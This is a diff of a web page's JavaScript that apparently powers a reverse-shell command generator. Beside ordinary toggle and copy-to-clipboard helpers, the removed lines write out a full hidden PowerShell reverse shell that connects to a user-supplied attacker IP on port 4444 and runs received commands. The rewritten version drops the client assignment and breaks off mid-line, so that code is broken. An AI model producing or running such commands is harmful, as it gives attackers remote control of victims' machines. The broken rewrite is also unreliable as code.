@@ -39,46 +39,29 @@ function downloadFiles() {
   document.body.removeChild(secondFileLink);
 }
 
-  // Toggle the visibility of the "read-more-content" section
-  function toggleReadMore(button) {
-    const content = button.previousElementSibling;
-    content.classList.toggle('hidden');
-    button.classList.toggle('collapsed');
-    button.classList.toggle('expanded');
-  }
+// Beispiel: script.js
 
-  // Copy the text inside a specific element to the clipboard
-  function copyToClipboard(elementId) {
-    const copyText = document.getElementById(elementId).innerText;
-    navigator.clipboard.writeText(copyText)
-      .then(() => {
-        alert('Copied to clipboard');
-      })
-      .catch((err) => {
-        alert('Failed to copy text: ' + err);
-      });
-  }
+function toggleReadMore(button) {
+  const content = button.previousElementSibling;
+  content.classList.toggle('hidden');
+  button.classList.toggle('collapsed');
+  button.classList.toggle('expanded');
+}
 
-  // Generate the PowerShell reverse shell command using the user-input IP
-  function generatePowerShellCommand() {
-    const attackerIP = document.getElementById('attackerIP').value.trim();
-    if (!attackerIP) {
-      alert('Please enter a valid IP address.');
-      return;
-    }
-    const command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "`
-      + `\$client = New-Object System.Net.Sockets.TCPClient('${attackerIP}',4444);`
-      + `\$stream = \$client.GetStream();`
-      + `\$bytes = 0..65535|%{0};`
-      + `while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){`
-      + `\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);`
-      + `\$sendback = (iex \$data 2>&1 | Out-String );`
-      + `\$sendback2  = \$sendback + 'PS ' + (pwd).Path + '> ';`
-      + `\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);`
-      + `\$stream.Write(\$sendbyte,0,\$sendbyte.Length);`
-      + `\$stream.Flush()`
-      + `}"`;
+function copyToClipboard(elementId) {
+  const copyText = document.getElementById(elementId).innerText;
+  navigator.clipboard.writeText(copyText)
+    .then(() => alert('Copied to clipboard'))
+    .catch((err) => alert('Failed to copy text: ' + err));
+}
 
-    const commandElement = document.getElementById('powershellCommand');
-    commandElement.innerText = command;
+function generatePowerShellCommand() {
+  const attackerIP = document.getElementById('attackerIP').value.trim();
+  if (!attackerIP) {
+    alert('Please enter a valid IP address.');
+    return;
   }
+  const command = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "` +
+    `New-Object System.Net.Sockets.TCPClient('${attackerIP}',4444);` +
+    `$stream = $client.GetStream();` +
+    `[byte[]]$
